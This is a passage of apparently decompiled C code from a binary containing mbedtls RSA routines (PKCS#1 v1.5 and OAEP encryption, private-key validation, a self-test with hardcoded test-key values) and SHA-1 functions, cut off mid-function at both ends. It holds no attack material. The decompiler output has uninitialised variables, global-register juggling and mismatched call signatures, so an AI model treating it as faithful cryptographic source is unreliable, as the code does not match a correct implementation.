                g7 = v5;
                g5 = v4;
                g1 = mbedtls_rsa_private(v2, v16, v7, v25, a3);
                // branch -> 0x80510f0
                // 0x80510f0
                v18 = (char *)v25;
                v21 = g6 & -256 | (int32_t)(g3 == 0);
                // branch -> 0x80510f5
                goto lab_0x80510f5_4;
            }
            // 0x80510ac
            v13 = v14 + v12;
            v14 = v13;
            v20 = v13;
            // branch -> 0x80510ae
        }
        // 0x80510ae
        *(char *)v20 = 0;
        memcpy((char *)(v14 + 1), a6, a5);
        g4 = a3;
        v25 = g5;
        v3 = a1;
        g3 = v6;
        g7 = v5;
        g5 = v4;
        g1 = mbedtls_rsa_private(v2, v16, v7, v25, a3);
        // branch -> 0x80510f0
        // 0x80510f0
        v18 = (char *)v25;
        v21 = g6 & -256 | (int32_t)(g3 == 0);
        // branch -> 0x80510f5
        goto lab_0x80510f5_4;
    }
    // 0x8050ff2
    if (a2 == NULL) {
        // 0x8050ffb
        g3 = v6;
        g7 = v5;
        g5 = v4;
        g2 = v1;
        return -0x4080;
    }
    // 0x8051018
    v23 = *(int32_t *)(v7 + 4);
    v9 = a5 + 11;
    g4 = v9;
    if (v23 < v9) {
        // 0x8050ffb
        g3 = v6;
        g7 = v5;
        g5 = v4;
        g2 = v1;
        return -0x4080;
    }
    // 0x8051028
    g4 = v8;
    v15 = -3 - a5 + v23;
    *a7 = 0;
    if (a4 == 0) {
        // 0x8051038
        v19 = g4;
        g7 = v19 + 2;
        *(char *)(v19 + 1) = 2;
        if (v15 == 0) {
            // 0x8051038
            // branch -> 0x8051117
        } else {
            // 0x8051049
            v27 = v15 - 1;
            g237 = v27 == 0;
            g6 = v27;
            v17 = a2;
            // branch -> 0x8051050
            // 0x8051050
            g3 = 100;
            v24 = g7;
            // branch -> 0x8051058
            goto lab_0x8051058;
        }
        // 0x8051117
        *(char *)g7 = 0;
        memcpy(v3, a2, a3);
        v22 = g2;
        v26 = *(int32_t *)(v22 - 36);
        g4 = v26;
        *(int32_t *)(v22 + 16) = v26;
        *(int32_t *)(g2 + 12) = g4;
        *(int32_t *)(g2 + 8) = *(int32_t *)(v22 - 32);
        g3 = v6;
        g7 = v5;
        g5 = v4;
        return mbedtls_rsa_public(v2, v16, (int32_t)v3);
    }
    // 0x8051088
    *(char *)(v8 + 1) = 1;
    v10 = v8 + 2;
    v14 = v10;
    v20 = v10;
    if (v15 != 0) {
        // 0x8051099
        *(char *)v10 = -1;
        v12 = 1;
        if (v15 != v12) {
            *(char *)(v12 + 2 + v8) = -1;
            v11 = v12 + 1;
            while (v15 != v11) {
                // 0x80510a0
                *(char *)(v11 + 2 + v8) = -1;
                v11++;
                // continue -> 0x80510a0
            }
            // 0x80510ac
            v13 = v14 + v11;
            // branch -> 0x80510ae
            // 0x80510ae
            *(char *)v13 = 0;
            memcpy((char *)(v13 + 1), a6, a5);
            g4 = a3;
            v25 = g5;
            v3 = a1;
            g3 = v6;
            g7 = v5;
            g5 = v4;
            g1 = mbedtls_rsa_private(v2, v16, v7, v25, a3);
            // branch -> 0x80510f0
            // 0x80510f0
            v18 = (char *)v25;
            v21 = g6 & -256 | (int32_t)(g3 == 0);
            // branch -> 0x80510f5
            goto lab_0x80510f5_4;
        }
        // 0x80510ac
        v13 = v14 + v12;
        v14 = v13;
        v20 = v13;
        // branch -> 0x80510ae
    }
    // 0x80510ae
    *(char *)v20 = 0;
    memcpy((char *)(v14 + 1), a6, a5);
    g4 = a3;
    v25 = g5;
    v3 = a1;
    g3 = v6;
    g7 = v5;
    g5 = v4;
    g1 = mbedtls_rsa_private(v2, v16, v7, v25, a3);
    // branch -> 0x80510f0
    // 0x80510f0
    v18 = (char *)v25;
    v21 = g6 & -256 | (int32_t)(g3 == 0);
    // branch -> 0x80510f5
    goto lab_0x80510f5_4;
}

// Address range: 0x8051150 - 0x805132f
int32_t mbedtls_rsa_rsaes_oaep_encrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, char * a9) {
    g7 = a4;
    g5 = (int32_t)a2;
    int32_t v1; // 0x80511f1
    int32_t v2; // 0x80511c0
    int32_t v3; // 0x8051221
    int32_t v4; // 0x8051274_0
    int32_t v5; // 0x805119c
    int32_t v6; // 0x80511bb
    int32_t result; // 0x805117f_2
    int32_t v7;
    int32_t v8;
    int32_t v9;
    int32_t v10; // 0x80512a2
    int32_t v11;
    int32_t v12; // 0x805120d
    int32_t v13; // 0x8051255
    uint32_t v14; // 0x80511aa
    int32_t v15; // 0x80512aa
    if (a4 == 1) {
        // 0x8051180
        if (*(int32_t *)((int32_t)a1 + 164) != 1) {
            // 0x805116e
            // branch -> 0x8051173
            // 0x8051173
            g2 = v8;
            return -0x4080;
        }
        // 0x805116a
        if (a2 != NULL) {
            // 0x8051190
            v5 = mbedtls_md_info_from_type(*(int32_t *)((int32_t)a1 + 168));
            g3 = v5;
            if (v5 != 0) {
                // 0x80511a7
                v14 = *(int32_t *)((int32_t)a1 + 4);
                v6 = mbedtls_md_get_size(v5) % 256;
                v2 = 2 * v6;
                g6 = v2;
                if (v14 >= a7 + 2 + v2) {
                    // 0x80511ce
                    v11 = (int32_t)a9;
                    memset(a9, 0, v14);
                    *a9 = 0;
                    v1 = v11 + 1;
                    g237 = v1 == 0;
                    g4 = v6;
                    g1 = a3;
                    ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v1, v6);
                    v12 = g1;
                    if (v12 != 0) {
                        // 0x8051211
                        // branch -> 0x8051173
                        // 0x8051173
                        g2 = v8;
                        return v12 - 0x4480;
                    }
                    // 0x805121b
                    v3 = v1 + v6;
                    g4 = v3;
                    mbedtls_md(g3, a5, a6, v3);
                    v13 = -2 - a7 + v14 - v2 + v3 + v6;
                    *(char *)v13 = 1;
                    g6 = a8;
                    memcpy((char *)(v13 + 1), (char *)a8, a7);
                    v4 = &v7;
                    g4 = v4;
                    mbedtls_md_init(&v7);
                    g1 = v4;
                    mbedtls_md_setup(&v7, g3, 0);
                    v10 = v14 - 1 - v6;
                    v15 = v11 + 1 + v6;
                    g3 = v15;
                    g6 = v10;
                    g1 = v15;
                    g4 = v1;
                    mgf_mask(v6, &v7, 0, v3, v9);
                    g6 = v6;
                    g4 = g3;
                    g1 = v1;
                    g1 = mgf_mask(v10, &v7, 0, v3, v9);
                    mbedtls_md_free((char *)&v7);
                    if (g7 == 0) {
                        // 0x80512eb
                        result = mbedtls_rsa_public((int32_t)a1, v11, v11);
                        // branch -> 0x8051173
                    } else {
                        // 0x8051306
                        result = mbedtls_rsa_private((int32_t)a1, g5, a3, v11, v11);
                        // branch -> 0x8051173
                    }
                    // 0x8051173
                    g2 = v8;
                    return result;
                }
            }
        }
        // 0x805116e
        // branch -> 0x8051173
        // 0x8051173
        g2 = v8;
        return -0x4080;
    }
    // 0x805116a
    if (a2 == NULL) {
        // 0x805116e
        // branch -> 0x8051173
        // 0x8051173
        g2 = v8;
        return -0x4080;
    }
    // 0x8051190
    v5 = mbedtls_md_info_from_type(*(int32_t *)((int32_t)a1 + 168));
    g3 = v5;
    if (v5 == 0) {
        // 0x805116e
        // branch -> 0x8051173
        // 0x8051173
        g2 = v8;
        return -0x4080;
    }
    // 0x80511a7
    v14 = *(int32_t *)((int32_t)a1 + 4);
    v6 = mbedtls_md_get_size(v5) % 256;
    v2 = 2 * v6;
    g6 = v2;
    if (v14 < a7 + 2 + v2) {
        // 0x805116e
        // branch -> 0x8051173
        // 0x8051173
        g2 = v8;
        return -0x4080;
    }
    // 0x80511ce
    v11 = (int32_t)a9;
    memset(a9, 0, v14);
    *a9 = 0;
    v1 = v11 + 1;
    g237 = v1 == 0;
    g4 = v6;
    g1 = a3;
    ((int32_t (*)(int32_t, int32_t, int32_t))g5)(a3, v1, v6);
    v12 = g1;
    if (v12 != 0) {
        // 0x8051211
        // branch -> 0x8051173
        // 0x8051173
        g2 = v8;
        return v12 - 0x4480;
    }
    // 0x805121b
    v3 = v1 + v6;
    g4 = v3;
    mbedtls_md(g3, a5, a6, v3);
    v13 = -2 - a7 + v14 - v2 + v3 + v6;
    *(char *)v13 = 1;
    g6 = a8;
    memcpy((char *)(v13 + 1), (char *)a8, a7);
    v4 = &v7;
    g4 = v4;
    mbedtls_md_init(&v7);
    g1 = v4;
    mbedtls_md_setup(&v7, g3, 0);
    v10 = v14 - 1 - v6;
    v15 = v11 + 1 + v6;
    g3 = v15;
    g6 = v10;
    g1 = v15;
    g4 = v1;
    mgf_mask(v6, &v7, 0, v3, v9);
    g6 = v6;
    g4 = g3;
    g1 = v1;
    g1 = mgf_mask(v10, &v7, 0, v3, v9);
    mbedtls_md_free((char *)&v7);
    if (g7 == 0) {
        // 0x80512eb
        result = mbedtls_rsa_public((int32_t)a1, v11, v11);
        // branch -> 0x8051173
    } else {
        // 0x8051306
        result = mbedtls_rsa_private((int32_t)a1, g5, a3, v11, v11);
        // branch -> 0x8051173
    }
    // 0x8051173
    g2 = v8;
    return result;
}

// Address range: 0x8051330 - 0x80513f5
int32_t mbedtls_rsa_pkcs1_encrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11) {
    // 0x8051330
    int32_t v1;
    int32_t v2 = v1; // bp-4
    int32_t v3 = g3; // 0x805133c
    g3 = a5;
    int32_t v4 = g7; // 0x8051342
    g7 = a6;
    int32_t v5 = g5; // 0x805134e
    int32_t v6 = *(int32_t *)(a1 + 164); // 0x8051351
    g5 = a7;
    int32_t v7 = &v2; // 0x80513dd
    int32_t v8 = v6; // 0x8051398
    if (v6 == 0) {
        // 0x8051367
        g5 = v5;
        g7 = v4;
        g3 = v3;
        int32_t v9;
        mbedtls_rsa_rsaes_pkcs1_v15_encrypt((char *)v1, (char *)v9, a1, a2, a3, (char *)a4, (char *)a5);
        v7 = g2;
        v8 = g4;
        // branch -> 0x8051398
    }
    // 0x8051398
    if (v8 != 1) {
        // 0x80513a2
        g3 = *(int32_t *)(v7 - 12);
        g7 = *(int32_t *)(v7 - 8);
        return -0x4100;
    }
    int32_t result = mbedtls_rsa_rsaes_oaep_encrypt((char *)a1, (char *)a2, a3, a4, a5, a6, a7, a8, (char *)a9); // 0x80513e4
    g3 = *(int32_t *)(g2 - 12);
    g7 = *(int32_t *)(g2 - 8);
    return result;
}

// Address range: 0x80513f6 - 0x80513ff
int32_t function_80513f6(int32_t a1) {
    // 0x80513f6
    return g7;
}

// Address range: 0x8051400 - 0x80519af
int32_t mbedtls_rsa_check_privkey(int32_t a1) {
    int32_t v1 = g7; // 0x8051409
    g7 = a1;
    int32_t v2 = g3; // 0x805140f
    int32_t v3 = g5; // 0x8051412
    int32_t v4 = mbedtls_rsa_check_pubkey(a1); // 0x8051418
    g3 = v4;
    int32_t result; // 0x8051423
    if (v4 == 0) {
        int32_t v5 = g7; // 0x8051438
        if (*(int32_t *)(v5 + 52) != 0) {
            int32_t v6 = *(int32_t *)(v5 + 64); // 0x8051446
            g3 = v6;
            if (v6 != 0) {
                int32_t v7 = *(int32_t *)(v5 + 40); // 0x805144d
                g4 = v7;
                if (v7 != 0) {
                    // 0x8051454
                    int32_t v8;
                    int32_t v9 = &v8; // 0x8051454_0
                    int32_t v10;
                    g5 = &v10;
                    mbedtls_mpi_init(&v8);
                    int32_t v11;
                    int32_t v12 = &v11; // 0x8051462_0
                    mbedtls_mpi_init(&v11);
                    int32_t v13;
                    int32_t v14 = &v13; // 0x805146d_0
                    mbedtls_mpi_init(&v13);
                    mbedtls_mpi_init((int32_t *)g5);
                    int32_t v15;
                    int32_t v16 = &v15; // 0x8051480_0
                    mbedtls_mpi_init(&v15);
                    int32_t v17;
                    int32_t v18 = &v17; // 0x805148b_0
                    mbedtls_mpi_init(&v17);
                    int32_t v19;
                    int32_t v20 = &v19; // 0x8051496_0
                    mbedtls_mpi_init(&v19);
                    int32_t v21;
                    int32_t v22 = &v21; // 0x80514a1_0
                    mbedtls_mpi_init(&v21);
                    int32_t v23;
                    int32_t v24 = &v23; // 0x80514ac_0
                    mbedtls_mpi_init(&v23);
                    int32_t v25;
                    int32_t v26 = &v25; // 0x80514ba_0
                    mbedtls_mpi_init(&v25);
                    int32_t v27;
                    int32_t v28 = &v27; // 0x80514c8_0
                    mbedtls_mpi_init(&v27);
                    int32_t v29;
                    int32_t v30 = &v29; // 0x80514d6_0
                    mbedtls_mpi_init(&v29);
                    int32_t v31;
                    int32_t v32 = &v31; // 0x80514e4_0
                    mbedtls_mpi_init(&v31);
                    int32_t v33 = g7; // 0x80514f2
                    int32_t v34 = v33 + 56; // 0x80514f2
                    int32_t v35 = v33 + 44; // 0x80514fb
                    int32_t v36 = mbedtls_mpi_mul_mpi(&v8, (int32_t *)v35, (int32_t *)v34); // 0x805151e
                    g3 = v9;
                    if (v36 == 0) {
                        int32_t v37 = g7; // 0x80515dc
                        int32_t v38 = v37 + 20; // 0x80515dc
                        int32_t v39 = v37 + 32; // 0x80515e5
                        int32_t v40 = mbedtls_mpi_mul_mpi(&v11, (int32_t *)v39, (int32_t *)v38); // 0x8051608
                        g3 = v12;
                        if (v40 == 0) {
                            int32_t v41 = mbedtls_mpi_sub_int(v14, v35, 1); // 0x805162f
                            g3 = v14;
                            if (v41 == 0) {
                                int32_t v42 = mbedtls_mpi_sub_int(g5, v34, 1); // 0x8051653
                                g3 = v42;
                                if (v42 == 0) {
                                    int32_t v43 = mbedtls_mpi_mul_mpi(&v15, &v13, (int32_t *)g5); // 0x8051673
                                    g3 = v16;
                                    if (v43 == 0) {
                                        int32_t v44 = mbedtls_mpi_gcd(v20, v38, v16); // 0x8051699
                                        g3 = v20;
                                        if (v44 == 0) {
                                            int32_t v45 = mbedtls_mpi_gcd(v22, v14, g5); // 0x80516b9
                                            g3 = v22;
                                            if (v45 == 0) {
                                                int32_t v46 = mbedtls_mpi_div_mpi(&v23, &v25, &v15, &v21); // 0x80516e9
                                                g3 = v24;
                                                if (v46 == 0) {
                                                    int32_t v47 = mbedtls_mpi_mod_mpi(v18, v12, v24); // 0x805170f
                                                    g3 = v18;
                                                    if (v47 == 0) {
                                                        int32_t v48 = mbedtls_mpi_mod_mpi(v28, v39, v14); // 0x8051738
                                                        g3 = v28;
                                                        if (v48 == 0) {
                                                            int32_t v49 = mbedtls_mpi_mod_mpi(v30, v39, g5); // 0x805175e
                                                            g3 = v30;
                                                            if (v49 == 0) {
                                                                int32_t v50 = mbedtls_mpi_inv_mod(v32, v34, v35); // 0x805178a
                                                                g3 = v32;
                                                                if (v50 == 0) {
                                                                    // 0x8051799
                                                                    if (mbedtls_mpi_cmp_mpi(&v8, (int32_t *)(g7 + 8)) == 0) {
                                                                        // 0x8051858
                                                                        if (mbedtls_mpi_cmp_mpi(&v27, (int32_t *)(g7 + 68)) == 0) {
                                                                            // 0x8051875
                                                                            if (mbedtls_mpi_cmp_mpi(&v29, (int32_t *)(g7 + 80)) == 0) {
                                                                                int32_t v51 = g7 + 92; // 0x8051892
                                                                                g7 = v51;
                                                                                if (mbedtls_mpi_cmp_mpi(&v31, (int32_t *)v51) == 0) {
                                                                                    // 0x80518af
                                                                                    if (mbedtls_mpi_cmp_int(v26, 0) == 0) {
                                                                                        // 0x80518cd
                                                                                        if (mbedtls_mpi_cmp_int(v18, 1) == 0) {
                                                                                            // 0x80518e8
                                                                                            if (mbedtls_mpi_cmp_int(v20, 1) == 0) {
                                                                                                // 0x8051903
                                                                                                g1 = v9;
                                                                                                mbedtls_mpi_free(&v8);
                                                                                                g1 = v12;
                                                                                                mbedtls_mpi_free(&v11);
                                                                                                g1 = v14;
                                                                                                g1 = mbedtls_mpi_free(&v13);
                                                                                                mbedtls_mpi_free((int32_t *)g5);
                                                                                                g1 = v16;
                                                                                                mbedtls_mpi_free(&v15);
                                                                                                g1 = v18;
                                                                                                mbedtls_mpi_free(&v17);
                                                                                                g1 = v20;
                                                                                                mbedtls_mpi_free(&v19);
                                                                                                g1 = v22;
                                                                                                mbedtls_mpi_free(&v21);
                                                                                                g1 = v24;
                                                                                                mbedtls_mpi_free(&v23);
                                                                                                g1 = v26;
                                                                                                mbedtls_mpi_free(&v25);
                                                                                                g1 = v28;
                                                                                                mbedtls_mpi_free(&v27);
                                                                                                g1 = v30;
                                                                                                mbedtls_mpi_free(&v29);
                                                                                                g1 = v32;
                                                                                                mbedtls_mpi_free(&v31);
                                                                                                // branch -> 0x8051423
                                                                                                // 0x8051423
                                                                                                result = g3;
                                                                                                g1 = result;
                                                                                                g7 = v1;
                                                                                                g3 = v2;
                                                                                                g5 = v3;
                                                                                                return result;
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                    // 0x80517b3
                                                                    g1 = v9;
                                                                    g3 = -0x4200;
                                                                    mbedtls_mpi_free(&v8);
                                                                    g1 = v12;
                                                                    mbedtls_mpi_free(&v11);
                                                                    g1 = v14;
                                                                    g1 = mbedtls_mpi_free(&v13);
                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                    g1 = v16;
                                                                    mbedtls_mpi_free(&v15);
                                                                    g1 = v18;
                                                                    mbedtls_mpi_free(&v17);
                                                                    g1 = v20;
                                                                    mbedtls_mpi_free(&v19);
                                                                    g1 = v22;
                                                                    mbedtls_mpi_free(&v21);
                                                                    g1 = v24;
                                                                    mbedtls_mpi_free(&v23);
                                                                    g1 = v26;
                                                                    mbedtls_mpi_free(&v25);
                                                                    g1 = v28;
                                                                    mbedtls_mpi_free(&v27);
                                                                    g1 = v30;
                                                                    mbedtls_mpi_free(&v29);
                                                                    g1 = v32;
                                                                    mbedtls_mpi_free(&v31);
                                                                    // branch -> 0x8051423
                                                                    // 0x8051423
                                                                    result = g3;
                                                                    g1 = result;
                                                                    g7 = v1;
                                                                    g3 = v2;
                                                                    g5 = v3;
                                                                    return result;
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    // 0x805152d
                    g1 = v9;
                    mbedtls_mpi_free(&v8);
                    g1 = v12;
                    mbedtls_mpi_free(&v11);
                    g1 = v14;
                    g1 = mbedtls_mpi_free(&v13);
                    mbedtls_mpi_free((int32_t *)g5);
                    g1 = v16;
                    mbedtls_mpi_free(&v15);
                    g1 = v18;
                    mbedtls_mpi_free(&v17);
                    g1 = v20;
                    mbedtls_mpi_free(&v19);
                    g1 = v22;
                    mbedtls_mpi_free(&v21);
                    g1 = v24;
                    mbedtls_mpi_free(&v23);
                    g1 = v26;
                    mbedtls_mpi_free(&v25);
                    g1 = v28;
                    mbedtls_mpi_free(&v27);
                    g1 = v30;
                    mbedtls_mpi_free(&v29);
                    g1 = v32;
                    mbedtls_mpi_free(&v31);
                    int32_t v52 = g3; // 0x80515c8
                    if (v52 != -0x4200) {
                        // if_80515d4_0_true
                        g3 = v52 - 0x4200;
                        // branch -> 0x8051423
                    }
                    // 0x8051423
                    result = g3;
                    g1 = result;
                    g7 = v1;
                    g3 = v2;
                    g5 = v3;
                    return result;
                }
            }
        }
        // 0x805143f
        g3 = -0x4200;
        // branch -> 0x8051423
    }
    // 0x8051423
    result = g3;
    g1 = result;
    g7 = v1;
    g3 = v2;
    g5 = v3;
    return result;
}

// Address range: 0x80519b0 - 0x8051d7f
int32_t mbedtls_rsa_self_test(int32_t a1) {
    int32_t v1;
    int32_t v2 = &v1; // 0x80519b9_0
    int32_t v3 = g3; // 0x80519bf
    int32_t v4 = g7; // 0x80519c5
    int32_t v5 = g5; // 0x80519c8
    mbedtls_rsa_init((char *)&v1, 0, 0);
    int32_t v6;
    int32_t v7 = mbedtls_mpi_read_string((char *)&v6, 16, "9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79"); // 0x8051a03
    g3 = &v6;
    int32_t result; // 0x8051a40
    if (v7 == 0) {
        // 0x8051a0e
        int32_t v8;
        int32_t v9 = mbedtls_mpi_read_string((char *)&v8, 16, "10001"); // 0x8051a27
        g3 = &v8;
        if (v9 == 0) {
            // 0x8051a50
            int32_t v10;
            int32_t v11 = mbedtls_mpi_read_string((char *)&v10, 16, "24BF6185468786FDD303083D25E64EFC66CA472BC44D253102F8B4A9D3BFA75091386C0077937FE33FA3252D28855837AE1B484A8A9A45F7EE8C0C634F99E8CDDF79C5CE07EE72C7F123142198164234CABB724CF78B8173B9F880FC86322407AF1FEDFDDE2BEB674CA15F3E81A1521E071513A1E85B5DFA031F21ECAE91A34D"); // 0x8051a69
            g3 = &v10;
            if (v11 == 0) {
                // 0x8051a74
                int32_t v12;
                int32_t v13 = mbedtls_mpi_read_string((char *)&v12, 16, "C36D0EB7FCD285223CFB5AABA5BDA3D82C01CAD19EA484A87EA4377637E75500FCB2005C5C7DD6EC4AC023CDA285D796C3D9E75E1EFC42488BB4F1D13AC30A57"); // 0x8051a8d
                g3 = &v12;
                if (v13 == 0) {
                    // 0x8051a98
                    int32_t v14;
                    int32_t v15 = mbedtls_mpi_read_string((char *)&v14, 16, "C000DF51A7C77AE8D7C7370C1FF55B69E211C2B9E5DB1ED0BF61D0D9899620F4910E4168387E3C30AA1E00C339A795088452DD96A9A5EA5D9DCA68DA636032AF"); // 0x8051ab1
                    g3 = &v14;
                    if (v15 == 0) {
                        // 0x8051ac0
                        int32_t v16;
                        int32_t v17 = mbedtls_mpi_read_string((char *)&v16, 16, "C1ACF567564274FB07A0BBAD5D26E2983C94D22288ACD763FD8E5600ED4A702DF84198A5F06C2E72236AE490C93F07F83CC559CD27BC2D1CA488811730BB5725"); // 0x8051ad9
                        g3 = &v16;
                        if (v17 == 0) {
                            // 0x8051ae8
                            int32_t v18;
                            int32_t v19 = mbedtls_mpi_read_string((char *)&v18, 16, "4959CBF6F8FEF750AEE6977C155579C7D8AAEA56749EA28623272E4F7D0592AF7C1F1313CAC9471B5C523BFE592F517B407A1BD76C164B93DA2D32A383E58357"); // 0x8051b01
                            g3 = &v18;
                            if (v19 == 0) {
                                // 0x8051b10
                                int32_t v20;
                                int32_t v21 = mbedtls_mpi_read_string((char *)&v20, 16, "9AE7FBC99546432DF71896FC239EADAEF38D18D2B2F0E2DD275AA977E2BF4411F5A3B2A5D33605AEBBCCBA7FEB9F2D2FA74206CEC169D74BF5A8C50D6F48EA08"); // 0x8051b29
                                g3 = &v20;
                                if (v21 == 0) {
                                    // 0x8051b38
                                    if (a1 != 0) {
                                        // 0x8051b75
                                        printf("  RSA key validation: ");
                                        // branch -> 0x8051b3e
                                    }
                                    // 0x8051b3e
                                    g7 = v2;
                                    if (mbedtls_rsa_check_pubkey(v2) == 0) {
                                        // 0x8051b83
                                        if (mbedtls_rsa_check_privkey(g7) == 0) {
                                            // 0x8051b92
                                            if (a1 != 0) {
                                                // 0x8051b98
                                                printf("passed\n  PKCS#1 encryption : ");
                                                // branch -> 0x8051ba4
                                            }
                                            // 0x8051ba4
                                            int32_t str;
                                            int32_t v22 = &str; // 0x8051ba4_0
                                            memcpy((char *)&str, (char *)&g23, 6);
                                            int32_t v23;
                                            int32_t v24 = &v23; // 0x8051bc4_0
                                            g7 = v24;
                                            g5 = v2;
                                            int32_t v25;
                                            if (mbedtls_rsa_pkcs1_encrypt(v2, (int32_t)myrand, 0, 0, 24, v22, v24, v25, 0, 0, 0) == 0) {
                                                // 0x8051c08
                                                if (a1 != 0) {
                                                    // 0x8051c0e
                                                    printf("passed\n  PKCS#1 decryption : ");
                                                    // branch -> 0x8051c1a
                                                }
                                                // 0x8051c1a
                                                int32_t v26;
                                                int32_t v27 = &v26; // 0x8051c21_0
                                                g5 = v27;
                                                int32_t n;
                                                int32_t v28 = mbedtls_rsa_pkcs1_decrypt(v2, (int32_t)myrand, 0, 1, (int32_t)&n, g7, v27, 24, 0, 0, 0, v22); // 0x8051c55
                                                if (v28 == 0) {
                                                    // 0x8051c62
                                                    if (memcmp((char *)g5, (char *)&str, n) == 0) {
                                                        // 0x8051c80
                                                        if (a1 != 0) {
                                                            // 0x8051c86
                                                            puts("passed");
                                                            printf("PKCS#1 data sign  : ");
                                                            // branch -> 0x8051c9e
                                                        }
                                                        // 0x8051c9e
                                                        int32_t v29;
                                                        int32_t v30 = &v29; // 0x8051ca1_0
                                                        g5 = v30;
                                                        int32_t v31 = mbedtls_sha1(v22, 24, v30, 1); // 0x8051cb3
                                                        g7 = v31;
                                                        mbedtls_rsa_pkcs1_sign(v2, (int32_t)myrand, 0, 1, 4, 0, g5, v31);
                                                        if (g1 == 0) {
                                                            // 0x8051cfe
                                                            if (a1 != 0) {
                                                                // 0x8051d04
                                                                printf("passed\n  PKCS#1 sig. verify: ");
                                                                // branch -> 0x8051d10
                                                            }
                                                            // 0x8051d10
                                                            g7 = v2;
                                                            if (mbedtls_rsa_pkcs1_verify(v2, 0, 0, 0, 4, 0, g5, v31) == 0) {
                                                                // 0x8051d56
                                                                if (a1 != 0) {
                                                                    // 0x8051d60
                                                                    puts("passed");
                                                                    putchar(10);
                                                                    // branch -> 0x8051a32
                                                                }
                                                                // 0x8051a32
                                                                mbedtls_rsa_free(v2, (int32_t)NULL);
                                                                // branch -> 0x8051a40
                                                                // 0x8051a40
                                                                result = g3;
                                                                g1 = result;
                                                                g7 = v4;
                                                                g3 = v3;
                                                                g5 = v5;
                                                                return result;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    // 0x8051b50
                                    g3 = 1;
                                    if (a1 != 0) {
                                        // 0x8051b5f
                                        g3 = 1;
                                        puts("failed");
                                        // branch -> 0x8051a40
                                    }
                                    // 0x8051a40
                                    result = g3;
                                    g1 = result;
                                    g7 = v4;
                                    g3 = v3;
                                    g5 = v5;
                                    return result;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // 0x8051a32
    mbedtls_rsa_free(v2, (int32_t)(char *)16);
    // branch -> 0x8051a40
    // 0x8051a40
    result = g3;
    g1 = result;
    g7 = v4;
    g3 = v3;
    g5 = v5;
    return result;
}

// Address range: 0x8052120 - 0x805213f
void mbedtls_sha1_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x805213a
        return;
    }
    // 0x805212a
    g6 = v1 + 92;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x8052133
    g1 = v2;
    // branch -> 0x8052130
    while (v2 != g6) {
        // 0x8052130
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x8052130
    }
    // 0x805213a
    // branch -> 0x805213a
}

// Address range: 0x8052140 - 0x8052166
void mbedtls_sha1_clone(char * a1, char * a2) {
    // 0x8052140
    g1 = (int32_t)a1;
    memcpy(a1, a2, 23);
}

// Address range: 0x8052167 - 0x805216f
int32_t function_8052167(int32_t a1) {
    // 0x8052167
    return g7;
}

// Address range: 0x8052170 - 0x80521af
void mbedtls_sha1_starts(int32_t * a1) {
    // 0x8052170
    g1 = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(g1 + 4) = 0;
    *(int32_t *)(g1 + 8) = 0x67452301;
    *(int32_t *)(g1 + 12) = -0x10325477;
    *(int32_t *)(g1 + 16) = -0x67452302;
    *(int32_t *)(g1 + 20) = 0x10325476;
    *(int32_t *)(g1 + 24) = -0x3c2d1e10;
}

// Address range: 0x80521b0 - 0x805352f
int32_t mbedtls_sha1_process(int32_t a1, char * a2) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *(char *)(v1 + 3); // 0x80521bc
    unsigned char v3 = *a2; // 0x80521c3
    unsigned char v4 = *(char *)(v1 + 1); // 0x80521cc
    unsigned char v5 = *(char *)(v1 + 2); // 0x80521d6
    int32_t v6 = 256 * (int32_t)v5 | 0x10000 * (int32_t)v4 | 0x1000000 * (int32_t)v3 | (int32_t)v2; // 0x80521dd
    unsigned char v7 = *(char *)(v1 + 4); // 0x80521e0
    unsigned char v8 = *(char *)(v1 + 5); // 0x80521e4
    unsigned char v9 = *(char *)(v1 + 7); // 0x80521f0
    unsigned char v10 = *(char *)(v1 + 6); // 0x80521f6
    int32_t v11 = 256 * (int32_t)v10 | 0x10000 * (int32_t)v8 | 0x1000000 * (int32_t)v7 | (int32_t)v9; // 0x80521fd
    unsigned char v12 = *(char *)(v1 + 8); // 0x8052202
    unsigned char v13 = *(char *)(v1 + 9); // 0x8052206
    unsigned char v14 = *(char *)(v1 + 11); // 0x8052212
    unsigned char v15 = *(char *)(v1 + 10); // 0x8052218
    int32_t v16 = 256 * (int32_t)v15 | 0x10000 * (int32_t)v13 | 0x1000000 * (int32_t)v12 | (int32_t)v14; // 0x805221f
    unsigned char v17 = *(char *)(v1 + 12); // 0x8052224
    unsigned char v18 = *(char *)(v1 + 13); // 0x8052228
    unsigned char v19 = *(char *)(v1 + 15); // 0x8052234
    unsigned char v20 = *(char *)(v1 + 14); // 0x805223a
    int32_t v21 = 256 * (int32_t)v20 | (int32_t)v19 | 0x10000 * (int32_t)v18 | 0x1000000 * (int32_t)v17; // 0x8052241
    unsigned char v22 = *(char *)(v1 + 16); // 0x8052246
    unsigned char v23 = *(char *)(v1 + 17); // 0x805224a
    unsigned char v24 = *(char *)(v1 + 19); // 0x8052256
    unsigned char v25 = *(char *)(v1 + 18); // 0x805225c
    int32_t v26 = 256 * (int32_t)v25 | 0x10000 * (int32_t)v23 | 0x1000000 * (int32_t)v22 | (int32_t)v24; // 0x8052263
    unsigned char v27 = *(char *)(v1 + 20); // 0x8052268
